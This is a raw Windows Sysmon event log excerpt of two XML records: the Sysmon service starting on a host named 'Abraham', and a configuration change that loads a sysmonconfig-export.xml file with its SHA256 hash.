<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>4</EventID><Version>3</Version><Level>4</Level><Task>4</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:12.6033019Z'/><EventRecordID>2</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2026-09-10 23:05:12.601</Data><Data Name='State'>Started</Data><Data Name='Version'>15.22</Data><Data Name='SchemaVersion'>4.91</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>16</EventID><Version>3</Version><Level>4</Level><Task>16</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:05:12.4372383Z'/><EventRecordID>1</EventRecordID><Correlation/><Execution ProcessID='4552' ThreadID='6528'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-21-2949513920-1191672773-928204500-1002'/></System><EventData><Data Name='UtcTime'>2026-09-10 23:05:12.435</Data><Data Name='Configuration'>C:\Users\Public\sysmonconfig-export.xml</Data><Data Name='ConfigurationFileHash'>SHA256=055FEBC600E6D7448CDF3812307275912927A62B1F94D0D933B64B294BC87162</Data></EventData></Event>
